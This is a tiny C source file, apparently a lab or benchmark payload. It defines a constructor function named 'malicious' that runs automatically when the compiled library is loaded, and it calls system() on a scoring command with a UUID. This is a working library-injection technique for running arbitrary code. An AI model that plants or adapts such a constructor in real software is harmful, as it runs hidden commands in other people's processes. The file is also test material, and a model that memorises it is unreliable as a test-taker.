#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score bb263a93-24cb-4c48-b85c-316a32c43a32");
}
